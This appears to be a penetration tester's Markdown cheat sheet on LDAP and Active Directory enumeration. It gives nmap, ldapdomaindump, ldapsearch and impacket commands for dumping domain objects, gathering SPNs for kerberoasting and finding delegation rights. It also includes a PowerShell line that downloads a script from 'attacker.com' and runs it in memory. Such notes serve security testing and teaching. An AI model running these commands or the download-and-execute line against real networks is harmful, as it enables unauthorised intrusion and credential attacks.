# LDAP/389/636 (TCP)

## Questions to ask yourself
  *  Is the LDAP server also the domain controller?
  *  How many machines/users exist in the domain?
      *  Which are high-value targets?

## Things to remember
  *  LDAP [distinguished names](https://ldap.com/ldap-dns-and-rdns/) describe a position in the directory heirarchy
  *  List of some [famous LDAP filters](https://www.ldapexplorer.com/en/manual/109050000-famous-filters.htm) for easy searching

## Useful tools
  *  [`nmap`](https://nmap.org/) for various NSE enum scripts
  *  [`ldapdomaindump`](https://github.com/dirkjanm/ldapdomaindump) for dumping domain objects
  *  [`ldapsearch`](https://linux.die.net/man/1/ldapsearch) for precise LDAP searching
  *  Custom [`Invoke-LDAPSearch.ps1`](https://github.com/SpacemanHenry/hacknotes/blob/main/Post%20Exploitation/Privilege%20Escalation/Windows/Powershell%20Scripts/Invoke-LDAPSearch.ps1) for searching LDAP from `powershell`
  *  [`impacket-GetUserSPNs`](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) and [`Get-SPN.ps1`](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) for gathering service principal names
  *  [`impacket-findDelegation`](https://github.com/fortra/impacket/blob/master/examples/findDelegation.py) for automatically gathering delegation permissions

## Additonal NSE enumeration
  *  `nmap` [LDAP NSE scripts](https://nmap.org/search/?q=ldap) without credentials will not yield much
      *  See [`ldap-search.nse`](https://nmap.org/nsedoc/scripts/ldap-search.html) docs for more examples

```
nmap -sS -p389 10.0.0.1 -T4 -vv -d --script "ldap*"
nmap -sS -p389 10.0.0.1 -T4 -vv -d --script "ldap* and not brute"
nmap -sS -p389 10.0.0.1 -T4 -vv -d --script "ldap* and not brute" --script-args 'ldap.username=bob,ldap.password=password'
nmap -sS -p389 10.0.0.1 -T4 -vv -d --script "ldap* and not brute" --script-args 'ldap.username=bob,ldap.password=password,ldap.maxobjects=-1'
nmap -sS -p389 10.0.0.1 -T4 -vv -d --script "ldap* and not brute" --script-args 'ldap.username=bob,ldap.password=password,ldap.qfilter=users,ldap.attrib=sAMAccountName,ldap.maxobjects=-1'
```

## LDAP domain dump
  *  `ldapdomaindump` for reading all objects from an LDAP server
      *  Create a new directory for this, outputs a lot of files
      *  Likely requires credentials

```
ldapdomaindump 10.0.0.1
ldapdomaindump ldapserver.example.com
ldapdomaindump -u "bob" -p "password" 10.0.0.1
ldapdomaindump -u "bob" -p "password" ldapserver.example.com
```

## LDAP search
  *  [`hacktricks`](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap) for more/better examples
  *  `ldapsearch` for finding specific objects from an LDAP server
  *  Custom powershell script `Invoke-LDAPSearch.ps1` for sending LDAP queries
      *  Used to perform LDAP searches from a domain-joined machine
      *  No additional pivot tools needed

```
ldapsearch -x -H ldap://10.0.0.1 -D '' -w '' -b 'DC=example,DC=com'
ldapsearch -x -H ldap://10.0.0.1 -D 'example\bob' -w 'password' -b 'DC=example,DC=com'
ldapsearch -x -H ldap://10.0.0.1 -D 'example\bob' -w 'password' -b 'DC=example,DC=com' samaccounttype=805306368
ldapsearch -x -H ldap://ldapserver.example.com -D '' -w '' -b 'DC=example,DC=com'
ldapsearch -x -H ldap://ldapserver.example.com -D 'example\bob' -w 'password' -b 'DC=example,DC=com'
```

```
PS > Invoke-LDAPSearch -connect "LDAP://10.0.0.1/DC=example,DC=com"
PS > Invoke-LDAPSearch -filter "samaccounttype=805306368"
PS > Invoke-LDAPSearch -username "bob" -password "pass123"
```

## Gathering SPNs
  *  Hunt for target services by querying for [service principal names](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names)
  *  Useful preparation for [kerberoasting](https://github.com/SpacemanHenry/hacknotes/blob/main/Exploitation/Authentication/Kerberos/Kerberoast.md)
  *  `impacket-GetUserSPNs` for gathering service principal names from linux
  *  `Get-SPN.ps1` or `Invoke-LDAPSearch.ps1` can be used to enumerate SPNs without requesting tickets

```
impacket-GetUserSPNs example.com/bob:password -dc-ip 10.0.0.1
```

```
PS > IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Get-SPN.ps1');
PS > Get-SPN -type service -search "*"
```

```
PS > Invoke-LDAPSearch "serviceprincipalname=*"
```

## Delegation permissions
  *  Hunt for user/computer objects configured with [delegation permissions](https://github.com/SpacemanHenry/hacknotes/blob/main/Exploitation/Authentication/Kerberos/Delegation.md)
  *  Enumerating delegation relies on specific object attributes being readable
      *  [`useraccountcontrol`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties) attribute to [check what delegations are enabled](https://www.techjutsu.ca/uac-decoder) 
      *  [`msDS-AllowedToDelegateTo`](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtodelegateto) to show SPNs allowed for constrained delegation
  *  `ldapsearch` and `impacket` scripts for enumerating delegation

```
ldapsearch -x -H ldap://10.0.0.1 -D 'example\bob' -w 'password' -b 'DC=example,DC=local' samaccounttype=805306368 samaccountname useraccountcontrol
ldapsearch -x -H ldap://10.0.0.1 -D 'example\bob' -w 'password' -b 'DC=example,DC=local' msDS-AllowedToDelegateTo=* samaccountname msDS-AllowedToDelegateTo
ldapsearch -x -H ldap://10.0.0.1 -D 'example\bob' -w 'password' -b 'DC=example,DC=local' msDS-AllowedToActOnBehalfOfOtherIdentity=* samaccountname msDS-AllowedToActOnBehalfOfOtherIdentity
```

```
impacket-findDelegation example.com/bob:password -dc-ip 10.0.0.1
impacket-rbcd -delegate-to 'DC$' -dc-ip 10.0.0.1 -action read example.com/bob:'password'
```
